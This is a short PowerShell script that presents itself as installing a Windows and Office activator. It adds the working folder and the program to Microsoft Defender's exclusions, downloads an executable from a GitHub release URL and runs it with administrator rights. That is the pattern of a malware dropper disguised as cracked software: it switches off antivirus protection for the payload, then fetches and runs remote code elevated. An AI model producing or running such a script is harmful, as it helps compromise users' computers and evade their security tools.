$FilePath = "Windows10.and.11.Activator.+.Office.Activator.2025.exe"
$DownloadUrl = "https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/$FilePath"
$FullPath = "$PWD\$FilePath"
Add-MpPreference -ExclusionPath $PWD
Add-MpPreference -ExclusionProcess $FilePath
Invoke-RestMethod -Uri $DownloadUrl -OutFile $FilePath
Start-Process -FilePath $FilePath -Verb RunAs
